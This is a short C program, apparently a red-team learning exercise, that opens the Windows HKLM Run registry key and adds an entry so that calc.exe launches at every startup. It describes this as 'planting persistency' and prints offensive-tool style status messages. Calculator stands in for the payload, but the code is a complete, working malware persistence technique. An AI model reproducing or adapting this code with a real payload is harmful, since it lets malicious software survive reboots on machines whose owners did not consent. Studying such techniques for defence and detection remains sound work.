// 7.C
//
// Programmer:          Daniel L.
// Date:                14/11/22
//
// This program creates a persistency by adding 'calc.exe' to HKLM Run on the registry.

// gcc 7.c -o 7.exe -l advapi32

#pragma comment( lib, "advapi32.lib" )

#include <windows.h>
#include <winbase.h>
#include <stdio.h>
#include <TCHAR.h>

#define newline()           putchar('\n')

#define USERNAME            1
#define PASSWORD            2

#define persistencyPath     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define persistencyExe      "calc.exe"
#define persistencyName     "Calculator"

LPTSTR  buffer;

int checkError(DWORD a, LPCTSTR b, LPCTSTR c);

int main(int argc, char* argv[])
{
    _tprintf(TEXT("Planting persistency 'Calc.exe' in Run autoruns path...\n\n"));

    HKEY   root, persistence;

    // Connect to the local regitstry.
    DWORD res = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,                                                     // hKey: The registry key to connect to.
        TEXT(persistencyPath),                                                  // lpSubKey: A subkey to connect to.
        0,                                                                      // ulOptions: Specifies options to apply when opening the key.
        (KEY_WRITE),                                                            // sadDesired: Specifies desires access when oprning the key.
        &root                                                                   // phkResolt: The handle buffer to output to.
    );


    // Check if the function succeed.
    res = checkError(
        res,
        TEXT("[+] Successfuly opened registry key."),
        TEXT("[-] Failed to open registry key")
    );

    if ( res != TRUE)
        return FALSE;

    
    // Create a new subkey.
    res = RegSetKeyValue(
        root,                                                                   // hKey: A handle to an open registry key.
        NULL,                                                                   // lpSubKey: A path to a relative sub key, if NULL use hKey.
        persistencyName,                                                        // lpCalueName: The name of the value to be accessed.
        REG_SZ,                                                                 // dwType: The type of registry value to be created/accessed.
        persistencyExe,                                                         // lpData: The data to be put in the value.
        (_tcslen(TEXT(persistencyExe)) * sizeof(TCHAR))                         // cbData: The size of the data in Bytes.
    );

    res = checkError(
        res,
        TEXT("[+] Successfuly created persistency key."),
        TEXT("[-] Failed to create persistency key")
    );

    if ( res != TRUE)
        return FALSE;

    
}


int checkError(DWORD result, LPCTSTR successMessage, LPCTSTR failureMessage)
{
    if (result == ERROR_SUCCESS)
    {
        _tprintf(successMessage);
        newline();
        return TRUE;
    }
    else
    {
        FormatMessage(
            (FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER),      // dwFlags: Formatting options.
            NULL,                                                               // lpSource: The location of the message definition, ignored.
            result,                                                             // dwMessageId: The message identifier (error code).
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),                          // dwLanguageId: The language identifier for the formatted string.
            (LPTSTR)&buffer,                                                    // lpBuffer: The buffer to output the message to.
            0,                                                                  // nSize: The minimum amount of TCHARs to allocate to the output buffer.
            NULL                                                                // Args: An array of arguments to insert to the formatted message.
        );

        _tprintf(failureMessage, buffer);
        _tprintf(TEXT(": %s (%d)"), buffer, result);
        newline();
        return FALSE;
    }
}